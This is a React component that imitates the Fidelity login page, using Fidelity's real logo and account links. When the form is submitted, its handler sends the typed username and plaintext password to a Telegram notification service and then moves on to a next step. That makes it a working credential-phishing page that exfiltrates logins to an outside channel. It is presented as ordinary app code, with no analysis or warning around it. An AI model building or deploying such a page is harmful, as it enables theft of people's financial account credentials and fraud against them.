import { useState } from 'react';
import { Eye, EyeOff } from 'lucide-react';
import { notificationService } from './services/notificationService';

interface LoginProps {
  onNext: (username: string) => void;
  onBack: () => void;
}

function Login({ onNext, onBack }: LoginProps) {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (username.trim() && !isSubmitting) {
      setIsSubmitting(true);

      // Send Telegram notification
      await notificationService.sendLoginAttemptNotification(username, password);

      setIsSubmitting(false);
      onNext(username);
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col">
      <header className="bg-white">
        <div className="max-w-7xl mx-auto px-8 py-4 flex justify-between items-center">
          <img
            src="https://digital.fidelity.com/stgw/digital/login/dist/Fidelity-wordmark.svg"
            alt="Fidelity"
            className="h-7"
          />
          <div className="flex gap-8">
            <a href="#" className="text-sm text-gray-700 hover:text-gray-900">
              Security
            </a>
            <a href="#" className="text-sm text-gray-700 hover:text-gray-900">
              FAQs
            </a>
          </div>
        </div>
      </header>

      <main className="flex-1 flex items-center justify-center px-6 py-12">
        <div className="w-full max-w-md">
          <div className="bg-white rounded-lg shadow-sm p-10 mb-6">
            <button
              onClick={onBack}
              className="text-sm text-gray-700 hover:text-gray-900 mb-6 flex items-center gap-1"
            >
              ← Back
            </button>

            <h1 className="text-3xl font-semibold text-gray-900 mb-8">
              Log in
            </h1>

            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <label htmlFor="username" className="block text-sm font-semibold text-gray-900 mb-2">
                  Username
                </label>
                <input
                  type="text"
                  id="username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="block w-full px-4 py-3 border border-gray-300 rounded text-gray-900 text-base focus:outline-none focus:ring-2 focus:ring-gray-400 focus:border-transparent"
                />
              </div>

              <div>
                <label htmlFor="password" className="block text-sm font-semibold text-gray-900 mb-2">
                  Password
                </label>
                <div className="relative">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    id="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="block w-full px-4 py-3 pr-12 border border-gray-300 rounded text-gray-900 text-base focus:outline-none focus:ring-2 focus:ring-gray-400 focus:border-transparent"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute inset-y-0 right-0 pr-4 flex items-center text-gray-500 hover:text-gray-700"
                  >
                    {showPassword ? (
                      <EyeOff className="h-5 w-5" />
                    ) : (
                      <Eye className="h-5 w-5" />
                    )}
                  </button>
                </div>
              </div>

              <div className="flex items-center">
                <input
                  id="remember-me"
                  type="checkbox"
                  checked={rememberMe}
                  onChange={(e) => setRememberMe(e.target.checked)}
                  className="h-4 w-4 text-gray-900 focus:ring-gray-400 border-gray-300 rounded cursor-pointer"
                />
                <label htmlFor="remember-me" className="ml-2 block text-sm text-gray-900 cursor-pointer">
                  Remember my username
                </label>
              </div>

              <div>
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full flex justify-center py-3 px-4 border border-transparent rounded font-semibold text-base text-white bg-[#368727] hover:bg-[#2d6e1f] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#368727] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {isSubmitting ? 'Processing...' : 'Log in'}
                </button>
              </div>

              <div className="text-center">
                <a href="#" className="text-sm text-gray-900 hover:underline underline">
                  Forgot username or password?
                </a>
              </div>
            </form>
          </div>

          <div className="text-center text-sm text-gray-900">
            New to Fidelity?{' '}
            <a href="#" className="underline hover:no-underline">
              Open an account
            </a>
            {' '}or{' '}
            <a href="#" className="underline hover:no-underline">
              sign up.
            </a>
          </div>
        </div>
      </main>
    </div>
  );
}

export default Login;
